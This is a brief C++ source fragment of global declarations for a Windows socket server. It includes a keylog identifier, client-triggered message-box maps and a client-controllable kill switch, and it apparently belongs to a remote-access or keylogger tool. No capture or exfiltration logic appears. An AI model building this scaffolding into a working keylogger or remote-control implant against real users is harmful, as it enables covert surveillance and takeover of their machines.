#include "server_header.h"

map<string, SERVERMESSAGE> dictionary;
map<string, UINT> MSGBOX_TYPES;
map<string, UINT> MSGBOX_ICONS;




unsigned int KEYLOG_ID;

string server_operator;
string server_operand;
string ipaddress = IP_ADDR;


int portnumber = PORTNO;

WSADATA wsa;
SOCKET sa, clientsock;
struct sockaddr_in server, client;
 char server_reply[buffersize];
//THIS BOOLEAN VALUE WILL MAKE THE SERVER KEEP WORKING. CAN BE DISABLED FROM CLIENT.
bool KILLSERVER = true, stream_is_true = true;





